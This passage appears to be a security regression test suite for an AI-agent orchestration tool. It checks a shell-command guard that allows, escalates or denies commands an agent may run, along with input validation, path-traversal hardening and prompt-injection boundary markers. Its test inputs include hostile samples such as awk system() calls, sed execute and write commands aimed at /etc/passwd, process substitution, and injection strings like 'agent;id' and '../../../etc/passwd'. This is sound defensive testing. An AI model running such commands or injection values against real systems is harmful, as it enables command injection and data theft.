    expect(src).toMatch(/spawnSync\(airun,\s*\["ailedger",\s*"append"/);
  });
});

describe("SEC-013: H3+H8 — awk/sed/find dangerous subcommands blocked", () => {

  test("awk system() is T2 escalate", () => {
    const r = runGuard(["classify", `awk 'BEGIN{system("id")}' /dev/null`]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("awk getline is T2 escalate", () => {
    // Note: avoid | and ; in input — globalBlocks catches those before awk rule
    const r = runGuard(["classify", "awk '{getline line}' file.txt"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("awk (read-only) is still T0 allow", () => {
    const r = runGuard(["classify", "awk '{print $1}' file.txt"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T0");
    expect(c.action).toBe("allow");
  });

  test("sed 'e cmd' (execute) is T2 escalate", () => {
    const r = runGuard(["classify", "sed 'e id'"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("sed 'w file' (write) is T2 escalate", () => {
    const r = runGuard(["classify", "sed 'w /tmp/exfil' /etc/passwd"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("sed 's/foo/bar/e' (execute flag) is T2 escalate", () => {
    const r = runGuard(["classify", "sed 's/foo/bar/e'"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("sed 's/foo/bar/' (safe substitution) is still T0 allow", () => {
    const r = runGuard(["classify", "sed 's/foo/bar/' file.txt"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T0");
    expect(c.action).toBe("allow");
  });

  test("find -fls (file output) is T2 escalate", () => {
    const r = runGuard(["classify", "find / -name passwd -fls /tmp/found"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("find -fprintf (file output) is T2 escalate", () => {
    const r = runGuard(["classify", "find . -fprintf /tmp/out '%p\\n'"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });
});

describe("SEC-013: H4 — watch.ts fireSignal uses spawnSync", () => {

  test("watch.ts uses spawnSync for signal notify", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/watch.ts"), "utf-8");
    // fireSignal must use spawnSync argument array, not execSync template
    expect(src).toMatch(/spawnSync\("bun",\s*\["run",\s*signalTs,\s*"notify"/);
    expect(src).toContain("SEC-013");
  });
});

describe("SEC-013: H5 — process substitution blocked", () => {

  test("cat <(id) is T3 deny (process substitution)", () => {
    const r = runGuard(["classify", "cat <(id)"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T3");
    expect(c.action).toBe("deny");
  });

  test("echo >(tee /tmp/x) is T3 deny (output process substitution)", () => {
    const r = runGuard(["classify", "echo >(tee /tmp/x)"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T3");
    expect(c.action).toBe("deny");
  });
});

describe("SEC-013: H6 — shellSafe strips newlines", () => {

  test("signal.ts shellSafe strips \\n (0x0a)", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    // The regex should include \x0a in the strip range
    expect(src).toMatch(/\\x0a/);
    expect(src).toContain("SEC-013");
  });
});

describe("SEC-013: H7 — heredoc operator blocked", () => {

  test("cat << EOF is T3 deny (heredoc)", () => {
    const r = runGuard(["classify", "cat << EOF"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T3");
    expect(c.action).toBe("deny");
  });
});

// ─── v0.9.2: ^input and ^stream signal commands ─────────────────────────────

describe("signal ^input and ^stream commands", () => {

  test("signal.ts has doInput function", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    expect(src).toContain("function doInput");
    expect(src).toContain("socat");
    expect(src).toContain("UNIX-CONNECT");
  });

  test("signal.ts has doStream function", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    expect(src).toContain("function doStream");
    expect(src).toContain("capture-pane");
  });

  test("^input requires agent and text args", () => {
    const r = runSignal(["input"]);
    expect(r.exitCode).toBe(2);
  });

  test("^input with missing socket returns 1 (not crash)", () => {
    const r = runSignal(["input", "@nonexistent-agent", "test input"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("no socket");
  });

  test("^stream requires agent arg", () => {
    const r = runSignal(["stream"]);
    expect(r.exitCode).toBe(2);
  });

  test("^stream with no tmux session returns 1 (not crash)", () => {
    const r = runSignal(["stream", "@nonexistent"]);
    expect(r.exitCode).toBe(1);
  });

  test("^input writes audit trail envelope", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    // doInput must call fileWriteSignal for audit
    const inputFn = src.slice(src.indexOf("function doInput"));
    expect(inputFn).toContain("fileWriteSignal");
  });

  test("signal help shows input and stream commands", () => {
    const r = runSignal(["help"]);
    expect(r.stderr).toContain("input");
    expect(r.stderr).toContain("stream");
  });
});

// ─── SEC-014: ^break findings fixed ─────────────────────────────────────────

describe("SEC-014: AGENCE.md path traversal hardening", () => {

  test("skill.ts rejects GIT_ROOT containing ..", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/skill.ts"), "utf-8");
    expect(src).toContain("SEC-014");
    expect(src).toContain('includes("..")');
  });

  test("skill.ts rejects symlinked AGENCE.md", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/skill.ts"), "utf-8");
    expect(src).toContain("isSymbolicLink");
    expect(src).toContain("rejected symlinked AGENCE.md");
  });

  test("router.sh rejects .. in GIT_ROOT", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/router.sh"), "utf-8");
    expect(src).toContain("SEC-014");
    expect(src).toContain("..*");
  });

  test("router.sh rejects symlinked AGENCE.md", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/router.sh"), "utf-8");
    expect(src).toContain("! -L");
  });

  test("router.sh strips null bytes from AGENCE.md content", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/router.sh"), "utf-8");
    expect(src).toContain("tr -d");
    expect(src).toContain("\\000");
  });
});

describe("SEC-014: ^input guard gate + agent name validation", () => {

  test("doInput validates agent name with regex", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    const doInput = src.substring(src.indexOf("function doInput"));
    expect(doInput).toContain("SEC-014");
    expect(doInput).toContain("/^[a-zA-Z0-9]");
  });

  test("doInput has guard gate for agentic callers", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    const doInput = src.substring(src.indexOf("function doInput"));
    expect(doInput).toContain("AI_ROLE");
    expect(doInput).toContain("guard.ts");
    expect(doInput).toContain("classify");
  });

  test("doInput verifies socket path stays within sockets dir", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    const doInput = src.substring(src.indexOf("function doInput"));
    expect(doInput).toContain("startsWith(resolvedDir)");
    expect(doInput).toContain("socket path traversal blocked");
  });

  test("^input rejects path traversal in agent name", () => {
    const r = runSignal(["input", "../../../etc/passwd", "test"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-014");
  });

  test("^input rejects agent name with special chars", () => {
    const r = runSignal(["input", "agent;id", "test"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-014");
  });

  test("^input rejects agent name with dots (path separator attempt)", () => {
    const r = runSignal(["input", "agent.evil.sock", "test"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-014");
  });
});

// ─── SEC-015: ^hack findings fixed ──────────────────────────────────────────

describe("SEC-015: ^stream agent name validation (H1/H2)", () => {

  test("doStream validates agent name with regex", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    const doStream = src.substring(src.indexOf("function doStream"));
    expect(doStream).toContain("SEC-015");
    expect(doStream).toContain("/^[a-zA-Z0-9]");
  });

  test("^stream rejects path traversal in agent name", () => {
    const r = runSignal(["stream", "../../../etc"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-015");
  });

  test("^stream rejects agent name with special chars", () => {
    const r = runSignal(["stream", "evil;id"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-015");
  });

  test("^stream rejects agent name with dots", () => {
    const r = runSignal(["stream", "agent.evil.sock"]);
    expect(r.exitCode).toBe(1);
    expect(r.stderr).toContain("SEC-015");
  });
});

describe("SEC-015: AI_ROLE readonly in aibash (H9)", () => {

  test("aibash makes AI_ROLE readonly", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    expect(src).toContain("readonly AI_ROLE");
    expect(src).toContain("SEC-015");
  });

  test("aibash sets AI_ROLE before readonly", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    const roleExport = src.indexOf("export AI_ROLE=");
    const roleReadonly = src.indexOf("readonly AI_ROLE");
    expect(roleExport).toBeGreaterThan(-1);
    expect(roleReadonly).toBeGreaterThan(roleExport);
  });
});

describe("SEC-015: MCP response size + timeout (H4/H18)", () => {

  test("callMcpTool has response size limit", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp-client.ts"), "utf-8");
    expect(src).toContain("MAX_RESPONSE_SIZE");
    expect(src).toContain("1024 * 1024");
    expect(src).toContain("truncated");
  });

  test("callMcpTool has call timeout via AbortController", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp-client.ts"), "utf-8");
    expect(src).toContain("AbortController");
    expect(src).toContain("CALL_TIMEOUT");
    expect(src).toContain("timed out");
  });
});

describe("SEC-015: AGENCE.md boundary markers + marker stripping (H7/H8)", () => {

  test("router.sh uses PROJECT-INSTRUCTIONS boundary markers", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/router.sh"), "utf-8");
    expect(src).toContain("PROJECT-INSTRUCTIONS-BEGIN");
    expect(src).toContain("PROJECT-INSTRUCTIONS-END");
    expect(src).toContain("SEC-015");
  });

  test("router.sh strips marker strings from AGENCE.md content", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/router.sh"), "utf-8");
    expect(src).toContain("(stripped)");
  });

  test("skill.ts strips marker strings from project instructions content", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/skill.ts"), "utf-8");
    const injection = src.indexOf("PROJECT-INSTRUCTIONS-BEGIN (stripped)");
    expect(injection).toBeGreaterThan(-1);
    expect(src).toContain("SEC-015");
  });
});

describe("SEC-017 HACK-03: task_id and agent_name injection hardening", () => {
  // _validate_task_id and _validate_agent_name guard against unquoted
  // interpolation of these values into the tmux new-window command string
  // and the Python registry heredoc in _tangent_register.

  function runAgentd(args: string[]): { stdout: string; stderr: string; exitCode: number } {
    const result = Bun.spawnSync([join(AGENCE_ROOT, "bin", "agentd"), ...args], {
      cwd: AGENCE_ROOT,
      env: {
        ...process.env,
        AGENCE_ROOT,
        PATH: process.env.PATH ?? "/usr/bin:/bin",
        AGENTD_SESSION: `sec017-test-${process.pid}-${Date.now()}`,
      },
      timeout: 10_000,
    });
    return {
      stdout: result.stdout.toString().trim(),
      stderr: result.stderr.toString().trim(),
      exitCode: result.exitCode,
    };
  }

  // ── _validate_task_id ────────────────────────────────────────────────────

  test("tangent create rejects task_id with semicolon (command injection)", () => {
    const r = runAgentd(["tangent", "create", "--task", "abcd1234;evil", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create rejects task_id with path traversal", () => {
    const r = runAgentd(["tangent", "create", "--task", "../../etc/passwd", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create rejects task_id with single quote (Python heredoc escape)", () => {
    const r = runAgentd(["tangent", "create", "--task", "abc'def1", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create rejects task_id with spaces", () => {
    const r = runAgentd(["tangent", "create", "--task", "abcd 123", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create rejects task_id that is too short", () => {
    const r = runAgentd(["tangent", "create", "--task", "abcd", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create rejects task_id with uppercase hex", () => {
    const r = runAgentd(["tangent", "create", "--task", "ABCD1234", "a1b2c3d4-0", "copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid task ID");
  });

  test("tangent create accepts valid hex8 task_id (fails later at session check)", () => {
    const r = runAgentd(["tangent", "create", "--task", "a1b2c3d4", "a1b2c3d4-0", "copilot"]);
    // Should NOT fail with "Invalid task ID" — validation passes; fails downstream at tmux/socat check
    expect(r.stderr).not.toContain("Invalid task ID");
    expect(r.exitCode).not.toBe(0); // non-zero because tmux/socat not available in CI
  });

  // ── _validate_agent_name ─────────────────────────────────────────────────

  test("tangent create rejects agent name with semicolon", () => {
    const r = runAgentd(["tangent", "create", "a1b2c3d4-0", "copilot;evil"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid agent name");
  });

  test("tangent create rejects agent name with path traversal", () => {
    const r = runAgentd(["tangent", "create", "a1b2c3d4-0", "../evil"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid agent name");
  });

  test("tangent create rejects agent name with single quote", () => {
    const r = runAgentd(["tangent", "create", "a1b2c3d4-0", "cop'ilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid agent name");
  });

  test("tangent create rejects agent name with uppercase", () => {
    const r = runAgentd(["tangent", "create", "a1b2c3d4-0", "Copilot"]);
    expect(r.exitCode).not.toBe(0);
    expect(r.stderr).toContain("Invalid agent name");
  });

  test("tangent create accepts valid agent names (fails later at session check)", () => {
    for (const name of ["copilot", "claude", "aider", "my-agent", "agent_1"]) {
      const r = runAgentd(["tangent", "create", "a1b2c3d4-0", name]);
      // Should NOT fail with "Invalid agent name" — validation passes; fails downstream at tmux/socat check
      expect(r.stderr).not.toContain("Invalid agent name");
      expect(r.exitCode).not.toBe(0); // non-zero because tmux/socat not available in CI
    }
  });

  // ── Code-level assertions (defense-in-depth) ────────────────────────────

  test("agentd defines _validate_task_id function", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin", "agentd"), "utf-8");
    expect(src).toContain("_validate_task_id");
    expect(src).toContain("SEC-017 HACK-03");
  });

  test("agentd defines _validate_agent_name function", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin", "agentd"), "utf-8");
    expect(src).toContain("_validate_agent_name");
  });

  test("agentd calls _validate_task_id in cmd_tangent_create", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin", "agentd"), "utf-8");
    // Both the function definition and call site must be present
    const defIdx = src.indexOf("_validate_task_id()");
    const callIdx = src.indexOf('_validate_task_id "$task_id"');
    expect(defIdx).toBeGreaterThan(-1);
    expect(callIdx).toBeGreaterThan(defIdx);
  });

  test("agentd calls _validate_agent_name in cmd_tangent_create", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin", "agentd"), "utf-8");
    const defIdx = src.indexOf("_validate_agent_name()");
    const callIdx = src.indexOf('_validate_agent_name "$agent"');
    expect(defIdx).toBeGreaterThan(-1);
    expect(callIdx).toBeGreaterThan(defIdx);
  });
});
